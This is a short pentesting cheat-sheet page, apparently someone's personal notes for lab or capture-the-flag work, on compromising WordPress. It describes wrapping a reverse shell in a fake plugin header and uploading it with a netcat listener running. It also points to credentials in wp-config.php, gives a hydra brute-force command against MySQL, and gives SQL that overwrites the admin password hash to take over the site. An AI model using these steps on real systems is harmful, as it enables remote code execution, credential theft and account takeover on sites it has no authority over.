# WordPress

### WP plugin shell

Modify rev.php to add the following header and zip, upload plugin as wp admin then activate

(with nc listening)

<pre><code><strong>&#x3C;?php
</strong><strong>/**
</strong>* Plugin Name: Reverse Shell Plugin2
* Plugin URI:
* Description: Reverse Shell Plugin2
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

...

</code></pre>

{% hint style="info" %}
nc -nlvp 443?
{% endhint %}

Check `/var/www/html/wp-config.php` for credentials

#### MySQL DB creds & WP User/Admin creds

```
find creds from wp-config.php thru RFI? to get DB access
or
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.168.88 mysql -t 4
use wordpress db
update wp_users set user_pass=md5('123456') where user_login='admin';

wp-login.php / wp-admin.php with admin:123456
```
